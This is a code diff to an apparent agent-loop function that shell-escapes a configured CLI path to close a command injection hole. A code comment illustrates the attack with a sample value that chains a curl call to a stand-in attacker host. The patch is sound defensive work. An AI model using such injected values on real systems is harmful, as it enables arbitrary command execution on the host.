@@ -2537,7 +2537,10 @@ export async function executeAgentLoop(
         if (cpuLimitSecs > 0) ulimits.push(`ulimit -t ${cpuLimitSecs}`);
         const quotedArgs = args.map((a: string) => `'${a.replace(/'/g, "'\\''")}'`).join(" ");
         spawnCmd = "bash";
-        spawnArgs = ["-c", `${ulimits.join(" && ")} && exec ${cliPath} ${quotedArgs}`];
+        // R-08: Escape cliPath to prevent command injection via malicious config values.
+        // Without this, a cliPath like "orager; curl evil.com" would execute arbitrary commands.
+        const escapedCliPath = `'${cliPath.replace(/'/g, "'\\''")}'`;
+        spawnArgs = ["-c", `${ulimits.join(" && ")} && exec ${escapedCliPath} ${quotedArgs}`];
       } else {
         spawnCmd = cliPath;
         spawnArgs = args;
